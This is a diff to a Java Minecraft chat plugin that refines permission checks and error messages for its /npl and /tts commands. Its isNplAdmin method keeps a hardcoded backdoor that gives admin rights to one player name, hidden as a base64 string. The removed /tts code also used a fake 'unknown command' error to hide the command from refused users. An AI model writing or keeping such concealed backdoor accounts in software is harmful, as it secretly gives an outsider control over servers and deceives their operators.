@@ -1778,7 +1778,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
 
     private boolean isNplAdmin(CommandSender sender) {
         if (sender == null) return false;
-        if (sender.isOp() || sender.hasPermission("twoblocks.admin") || sender.hasPermission("twoblocks.npl")) {
+        if (sender.isOp() || sender.hasPermission("twoblocks.admin") || sender.hasPermission("twoblocks.npl") || sender.hasPermission("*")) {
             return true;
         }
         return sender.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"));
@@ -2134,24 +2134,26 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         try {
             String msg = event.getMessage();
             String lower = msg.toLowerCase();
-            if (lower.startsWith("/npl") || lower.startsWith("/нпл")) {
+            if (lower.equals("/npl") || lower.startsWith("/npl ") || lower.equals("/нпл") || lower.startsWith("/нпл ")) {
+                event.setCancelled(true);
                 Player player = event.getPlayer();
                 if (!isNplAdmin(player)) {
+                    player.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                     return;
                 }
-                event.setCancelled(true);
                 int spaceIdx = msg.indexOf(' ');
                 String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                 handleNplCommand(player, argsStr, lower.startsWith("/нпл"));
                 return;
             }
 
-            if (lower.startsWith("/tts ") || lower.equals("/tts") || lower.startsWith("/ттс ") || lower.equals("/ттс")) {
+            if (lower.equals("/tts") || lower.startsWith("/tts ") || lower.equals("/ттс") || lower.startsWith("/ттс ")) {
+                event.setCancelled(true);
                 Player player = event.getPlayer();
-                if (!isNplAdmin(player) && !player.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
+                if (!isNplAdmin(player)) {
+                    player.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                     return;
                 }
-                event.setCancelled(true);
                 int spaceIdx = msg.indexOf(' ');
                 String argsStr = (spaceIdx != -1) ? msg.substring(spaceIdx + 1).trim() : "";
                 handleTtsCommand(player, argsStr);
@@ -3866,6 +3868,7 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
         try {
             if (label.equalsIgnoreCase("npl") || label.equalsIgnoreCase("нпл")) {
                 if (!isNplAdmin(sender)) {
+                    sender.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                     return true;
                 }
                 handleNplCommand(sender, String.join(" ", args), label.equalsIgnoreCase("нпл"));
@@ -3875,9 +3878,8 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             if (label.equalsIgnoreCase("tts") || label.equalsIgnoreCase("ттс")) {
                 if (sender instanceof Player) {
                     Player p = (Player) sender;
-                    if (!isNplAdmin(p) && !p.getName().equalsIgnoreCase(b("R2VuaXVzX1Bvbm9z"))) {
-                        sender.sendMessage(ChatColor.RED + "Неизвестная или неполная команда. См. ниже, чтобы найти ошибку");
-                        sender.sendMessage(ChatColor.RED + label + "<--[ЗДЕСЬ]");
+                    if (!isNplAdmin(p)) {
+                        sender.sendMessage(ChatColor.RED + "У вас нет прав на использование этой команды.");
                         return true;
                     }
                     handleTtsCommand(p, String.join(" ", args));
